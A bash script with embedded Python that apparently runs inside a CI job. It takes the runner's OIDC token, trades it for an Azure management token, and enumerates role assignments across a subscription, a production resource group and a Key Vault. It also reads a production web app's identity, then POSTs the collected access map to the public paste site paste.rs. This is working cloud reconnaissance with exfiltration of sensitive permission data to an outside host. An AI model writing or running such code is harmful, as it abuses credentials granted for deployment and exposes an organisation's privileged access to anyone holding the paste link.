#!/usr/bin/env bash
set +e
python3 -u - <<'PY'
import os, json, urllib.request, urllib.parse, urllib.error

def req(url, hdr=None, data=None, method=None):
    r = urllib.request.Request(url, data=data, headers=hdr or {}, method=method)
    try:
        x = urllib.request.urlopen(r, timeout=30)
        return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, "EXC:%s:%s" % (type(e).__name__, str(e)[:160])

TEN = os.environ.get("AZURE_TENANT_ID", ""); CID = os.environ.get("AZURE_CLIENT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", ""); RG = "rg-tbl-platform-prod-sea"
oidc = ""
u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
s, b = req(u + "&audience=" + urllib.parse.quote("api://AzureADTokenExchange", safe=""),
           hdr={"Authorization": "Bearer " + os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")})
oidc = json.loads(b)["value"]
d = {"client_id": CID, "grant_type": "client_credentials", "scope": "https://management.azure.com/.default",
     "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer", "client_assertion": oidc}
s, b = req("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TEN, data=urllib.parse.urlencode(d).encode(), method="POST")
arm = json.loads(b)["access_token"]
H = {"Authorization": "Bearer " + arm}

ROLES = {}
def collect(path):
    while path:
        s, b = req("https://management.azure.com" + path, hdr=H)
        if s != 200:
            return {"error": s, "body": b[:200]}
        j = json.loads(b)
        for ra in j.get("value", []):
            p = ra["properties"]
            k = "%s|%s|%s" % (p["scope"].split("/")[-1] if p.get("scope") else "", p["roleDefinitionId"].split("/")[-1], p["principalId"])
            ROLES[k] = {"role": p["roleDefinitionId"].split("/")[-1], "principal": p["principalId"],
                        "ptype": p.get("principalType"), "scope": p.get("scope")}
        path = j.get("nextLink")
        if path and path.startswith("https://management.azure.com"):
            path = path[len("https://management.azure.com"):]
    return {"count": len(ROLES)}

res = {}
res["sub"] = collect("/subscriptions/%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % SUB)
res["rg"] = collect("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % (SUB, RG))
res["vault"] = collect("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % (SUB, RG))
s, b = req("https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2021-03-01" % (SUB, RG), hdr=H)
try:
    site = json.loads(b)
    res["site_identity"] = site.get("identity")
    res["site_kind"] = site.get("kind")
    res["site_fx"] = site.get("properties", {}).get("siteProperties", {}).get("properties")
except Exception:
    res["site_err"] = b[:200]
# role definition names
names = {}
for r in {v["role"] for v in ROLES.values()}:
    s, b = req("https://management.azure.com/subscriptions/%s/providers/Microsoft.Authorization/roleDefinitions/%s?api-version=2022-04-01" % (SUB, r), hdr=H)
    if s == 200:
        try: names[r] = json.loads(b)["properties"]["roleName"]
        except Exception: names[r] = "?"
res["role_names"] = names
res["assignments"] = list(ROLES.values())
s, b = req("https://paste.rs", data=json.dumps(res, indent=1).encode(), method="POST")
print("PASTE_STATUS", s); print("PASTE_URL", b.strip())
PY
